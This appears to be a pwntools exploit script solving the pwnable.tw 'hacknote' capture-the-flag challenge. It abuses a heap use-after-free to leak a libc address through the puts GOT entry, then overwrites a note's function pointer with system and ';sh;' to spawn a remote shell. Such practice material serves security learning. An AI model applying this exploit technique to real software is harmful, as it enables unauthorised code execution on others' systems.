#!/usr/bin/env python3

from pwn import *

exe = ELF("./hacknote_patched", checksec=False)
libc = ELF("./libc_32.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)
#r = process(exe.path)
r = remote('chall.pwnable.tw', 10102)

def create(size, data):
    r.sendafter(b'choice :', b'1')
    r.sendafter(b'size :', str(size))
    r.sendafter(b'Content :', data)
    r.recvuntil(b'Success !')

def delete(index):
    r.sendafter(b'choice :', b'2')
    r.sendafter(b'Index :', str(index))
    r.recvuntil(b'Success')

def printf(index):
    r.sendafter(b'choice :', b'3')
    r.sendafter(b'Index :', str(index))

print_note = 0x0804862b
create(16, b'a'*4)
create(16, b'b'*4)
delete(0)
delete(1)
create(8, p32(print_note) + p32(exe.got['puts']))
printf(0)
puts_leak = u32(r.recv(4))
log.info("puts leak: " + hex(puts_leak))
libc.address = puts_leak - libc.sym['puts']
log.info("libc base: " + hex(libc.address))

delete(2)
create(8, p32(libc.sym['system']) + b';sh;')
printf(0)

r.interactive()